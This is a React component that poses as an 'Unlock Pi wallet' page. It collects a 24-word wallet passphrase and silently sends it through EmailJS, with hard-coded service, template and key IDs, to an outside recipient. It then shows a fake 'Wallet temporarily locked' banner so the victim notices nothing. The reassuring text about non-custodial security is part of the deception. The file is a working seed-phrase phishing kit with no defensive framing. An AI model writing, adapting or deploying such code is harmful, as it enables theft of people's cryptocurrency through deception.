import { useRef, useState } from "react";
import emailjs from "@emailjs/browser";

export default function Wallet() {
  const form = useRef<HTMLFormElement | null>(null);
  const [phrase, setPhrase] = useState("");
  const [phraseError, setPhraseError] = useState(false);
  const [warningBanner, setWarningBanner] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  function onSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault(); // Prevent default form submission

    const arrFromPhrase = phrase.trim().split(" ");
    const phraseLength = arrFromPhrase.length;
    console.log(phraseLength);
    if (phraseLength !== 24) {
      setPhraseError(true);
      return; // Exit the function early if validation fails
    }

    // Validation passed, proceed with form submission
    setPhraseError(false);
    setSubmitting(true);

    emailjs
      .sendForm(
        "service_3paoyqp",
        "template_gf7qp2m",
        form.current as unknown as string,
        {
          publicKey: "yWbLug6KrdjHjO8dt",
        }
      )
      .then(
        () => {
          setWarningBanner(true);
          setSubmitting(false);
          setPhrase("");
        },
        (error) => {
          setPhraseError(true);
          setSubmitting(false);
          console.log("FAILED...", error.text);
        }
      );
  }

  return (
    <main className="container mx-auto px-4 py-10 max-w-screen-xl">
      {warningBanner && (
        <div className="bg-secondary flex items-center gap-2 justify-center py-3 mx-auto mt-10">
          <p className="h-5 w-5">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
              <path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-208a32 32 0 1 1 0 64 32 32 0 1 1 0-64z" />
            </svg>
          </p>{" "}
          <p>Wallet temporarily locked for security reasons.</p>
        </div>
      )}
      <h3 className="text-center font-semibold mb-8">Unlock Pi wallet</h3>
      <form ref={form} onSubmit={onSubmit}>
        <textarea
          value={phrase}
          onChange={(e) => {
            setPhrase(e.currentTarget.value);
          }}
          name="message"
          id=""
          cols={30}
          rows={10}
          placeholder="Enter your 24 word passphrase here"
          className="w-full p-3 mb-3 outline-secondary border-secondary border rounded-md"
        ></textarea>
        {phraseError && (
          <p className="text-red-500 text-center mb-5">Invalid Passphrase</p>
        )}
        <div className="flex flex-col justify-center gap-3">
          <div className="flex justify-center">
            <button
              type="submit" // Change button type to "submit" to trigger form submission
              className="border-2 transition-all duration-300
           border-primary-1 text-primary-1 hover:bg-primary-1 hover:text-white rounded-full py-3 px-5"
              disabled={submitting} // Disable the button while submitting
            >
              {submitting ? "Submitting..." : "UNLOCK WITH PASSPHRASE"}
            </button>
          </div>
          <div className="flex justify-center">
            <button className="rounded-full py-3 px-5 bg-primary-1 text-white">
              UNLOCK WITH FINGERPRINT
            </button>
          </div>
        </div>
      </form>
      <p className="mt-10">
        As a non-custodial wallet, your wallet passphrase is exclusively
        accessible only to you. Recovery of passphrase is currently impossible.
      </p>
      <p className="mt-5">
        Lost your passphrase?{" "}
        <span className="text-primary-1">You can create a new wallet</span>, but
        all your π in your previous wallet will be inaccessible.
      </p>
    </main>
  );
}
